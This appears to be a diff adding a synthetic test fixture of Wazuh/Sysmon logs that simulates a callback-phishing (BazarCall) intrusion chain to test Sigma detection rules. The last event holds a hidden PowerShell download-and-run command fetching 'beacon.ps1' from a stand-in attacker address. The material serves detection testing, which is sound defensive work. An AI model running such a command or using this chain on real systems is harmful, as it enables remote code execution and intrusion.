@@ -1,0 +1,404 @@
+{
+  "_metadata": {
+    "attack_id": "T1566.004",
+    "variation": "001",
+    "name": "Callback Phishing (BazarCall/Vishing)",
+    "description": "Victim receives vishing call instructing them to visit URL or execute actions - detected via subsequent technical indicators",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "initial-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 22 - DNS query to fake support domain (post-vishing call)",
+      "sequence": 1,
+      "timestamp": "2026-02-08T12:55:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:55:00.000+0000",
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 22: DNS Query to Fake Support Domain",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1566.004"
+            ],
+            "tactic": [
+              "Initial Access"
+            ],
+            "technique": [
+              "Phishing: Spearphishing Voice"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400036",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "22",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:55:00.000",
+              "processGuid": "{T1566004-0001-0001-0001-000000000001}",
+              "processId": "7400",
+              "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+              "queryName": "secure-microsoft-support.com",
+              "queryStatus": "0",
+              "queryResults": "198.51.100.110",
+              "user": "CORP\\jsmith"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1566.004",
+        "_fomorian_expected_detection": "Sigma: DNS Query to Fake Support Domain (T1566.004)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 11 - RMM tool download (instructed by vishing caller)",
+      "sequence": 2,
+      "timestamp": "2026-02-08T12:55:30.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:55:30.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 11: RMM Tool Downloaded",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1566.004",
+              "T1219"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Command and Control"
+            ],
+            "technique": [
+              "Phishing: Spearphishing Voice",
+              "Remote Access Software"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400037",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "11",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:55:30.000",
+              "processGuid": "{T1566004-0001-0001-0001-000000000001}",
+              "processId": "7400",
+              "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+              "targetFilename": "C:\\Users\\jsmith\\Downloads\\SupportAssist.exe",
+              "creationUtcTime": "2026-02-08 12:55:30.000",
+              "user": "CORP\\jsmith"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1566.004",
+        "_fomorian_expected_detection": "Sigma: RMM Tool Download After Vishing (T1566.004)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - User executes RMM tool (instructed by vishing caller)",
+      "sequence": 3,
+      "timestamp": "2026-02-08T12:56:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:56:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: RMM Tool Execution",
+          "id": "100910",
+          "mitre": {
+            "id": [
+              "T1566.004",
+              "T1219"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Command and Control"
+            ],
+            "technique": [
+              "Phishing: Spearphishing Voice",
+              "Remote Access Software"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400038",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:56:00.000",
+              "processGuid": "{T1566004-0001-0001-0001-000000000002}",
+              "processId": "7500",
+              "image": "C:\\Users\\jsmith\\Downloads\\SupportAssist.exe",
+              "fileVersion": "1.0.0.0",
+              "description": "Support Assistant Tool",
+              "product": "Remote Support",
+              "company": "Unknown",
+              "originalFileName": "SupportAssist.exe",
+              "commandLine": "\"C:\\Users\\jsmith\\Downloads\\SupportAssist.exe\"",
+              "currentDirectory": "C:\\Users\\jsmith\\Downloads\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "High",
+              "hashes": "SHA256=MALICIOUS_RMM_HASH",
+              "parentProcessGuid": "{T1566004-0001-0001-0000-000000000001}",
+              "parentProcessId": "3456",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\Explorer.EXE"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1566.004",
+        "_fomorian_expected_detection": "Sigma: Suspicious RMM Tool Execution (T1566.004)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - RMM tool connects to attacker C2",
+      "sequence": 4,
+      "timestamp": "2026-02-08T12:56:05.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:56:05.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 3: RMM Tool C2 Connection",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1566.004",
+              "T1219",
+              "T1071.001"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Command and Control"
+            ],
+            "technique": [
+              "Phishing: Spearphishing Voice",
+              "Remote Access Software",
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400039",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:56:05.000",
+              "processGuid": "{T1566004-0001-0001-0001-000000000002}",
+              "processId": "7500",
+              "image": "C:\\Users\\jsmith\\Downloads\\SupportAssist.exe",
+              "user": "CORP\\jsmith",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "53001",
+              "destinationIsIpv6": "false",
+              "destinationIp": "198.51.100.110",
+              "destinationHostname": "",
+              "destinationPort": "443",
+              "destinationPortName": "https"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1566.004",
+        "_fomorian_expected_detection": "Sigma: RMM Tool C2 Connection (T1566.004)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Attacker runs commands via RMM (post-vishing access)",
+      "sequence": 5,
+      "timestamp": "2026-02-08T12:57:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T12:57:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Command Execution via RMM",
+          "id": "100910",
+          "mitre": {
+            "id": [
+              "T1566.004",
+              "T1059.001"
+            ],
+            "tactic": [
+              "Initial Access",
+              "Execution"
+            ],
+            "technique": [
+              "Phishing: Spearphishing Voice",
+              "PowerShell"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.400040",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 12:57:00.000",
+              "processGuid": "{T1566004-0001-0001-0001-000000000003}",
+              "processId": "7600",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.110/beacon.ps1')\"",
+              "currentDirectory": "C:\\Users\\jsmith\\Downloads\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{T1566004-0001-0001-0001-000000000002}",
+              "parentProcessId": "7500",
+              "parentImage": "C:\\Users\\jsmith\\Downloads\\SupportAssist.exe",
+              "parentCommandLine": "\"C:\\Users\\jsmith\\Downloads\\SupportAssist.exe\""
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-initial-access",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1566.004",
+        "_fomorian_expected_detection": "Sigma: RMM Spawns PowerShell (T1566.004)"
+      }
+    }
+  ]
+}
